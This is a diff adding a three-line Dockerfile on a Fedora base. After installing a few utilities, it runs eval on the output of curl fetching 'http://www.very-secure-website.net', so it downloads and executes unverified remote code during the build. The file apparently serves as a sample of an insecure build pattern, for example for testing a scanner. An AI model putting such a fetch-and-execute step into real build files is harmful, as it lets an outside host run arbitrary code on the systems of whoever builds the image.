@@ -1,0 +1,3 @@
+FROM fedora
+RUN dnf install -y unzip zip curl which
+RUN eval `curl -s "http://www.very-secure-website.net"`
